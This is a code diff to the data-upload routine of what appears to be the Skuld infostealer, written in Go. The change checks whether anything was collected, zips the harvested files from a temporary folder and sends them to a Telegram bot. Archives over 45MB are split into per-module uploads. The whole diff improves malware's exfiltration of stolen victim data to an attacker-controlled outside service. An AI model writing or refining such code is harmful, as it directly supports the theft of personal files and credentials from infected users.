@@ -74,6 +74,12 @@ func (dc *DataCollector) SendCollectedData() error {
 	dc.mutex.Lock()
 	defer dc.mutex.Unlock()
 
+	// Check if we have any data to send
+	files, err := os.ReadDir(dc.TempDir)
+	if err != nil || len(files) == 0 {
+		return fmt.Errorf("no data collected to send")
+	}
+
 	// Create final archive
 	archivePath := filepath.Join(os.TempDir(), "skuld-data.zip")
 	
@@ -81,8 +87,20 @@ func (dc *DataCollector) SendCollectedData() error {
 		return fmt.Errorf("failed to create archive: %v", err)
 	}
 
-	// Send archive via Telegram
-	caption := "🔍 Skuld Data Collection Complete\n📦 Collected data archive"
+	// Check archive size and split if necessary (Telegram has 50MB limit)
+	archiveInfo, err := os.Stat(archivePath)
+	if err != nil {
+		return fmt.Errorf("failed to get archive info: %v", err)
+	}
+
+	// If archive is larger than 45MB, send individual module archives
+	if archiveInfo.Size() > 45*1024*1024 {
+		os.Remove(archivePath)
+		return dc.sendModuleArchives()
+	}
+
+	// Send single archive via Telegram
+	caption := fmt.Sprintf("🔍 Skuld Data Collection Complete\n📦 Archive size: %.2f MB\n📁 Contains all collected data", float64(archiveInfo.Size())/(1024*1024))
 	if err := dc.TelegramBot.SendDocument(archivePath, caption); err != nil {
 		// Clean up and return error
 		os.Remove(archivePath)
@@ -91,7 +109,41 @@ func (dc *DataCollector) SendCollectedData() error {
 
 	// Clean up
 	os.Remove(archivePath)
-	os.RemoveAll(dc.TempDir)
+	return nil
+}
+
+func (dc *DataCollector) sendModuleArchives() error {
+	modules, err := os.ReadDir(dc.TempDir)
+	if err != nil {
+		return fmt.Errorf("failed to read temp directory: %v", err)
+	}
+
+	for _, module := range modules {
+		if !module.IsDir() {
+			continue
+		}
+
+		modulePath := filepath.Join(dc.TempDir, module.Name())
+		archivePath := filepath.Join(os.TempDir(), fmt.Sprintf("skuld-%s.zip", module.Name()))
+
+		if err := fileutil.Zip(modulePath, archivePath); err != nil {
+			continue // Skip this module if zip fails
+		}
+
+		archiveInfo, err := os.Stat(archivePath)
+		if err != nil {
+			os.Remove(archivePath)
+			continue
+		}
+
+		caption := fmt.Sprintf("📦 Module: %s\n💾 Size: %.2f MB", module.Name(), float64(archiveInfo.Size())/(1024*1024))
+		if err := dc.TelegramBot.SendDocument(archivePath, caption); err != nil {
+			os.Remove(archivePath)
+			continue // Continue with other modules even if one fails
+		}
+
+		os.Remove(archivePath)
+	}
 
 	return nil
 }
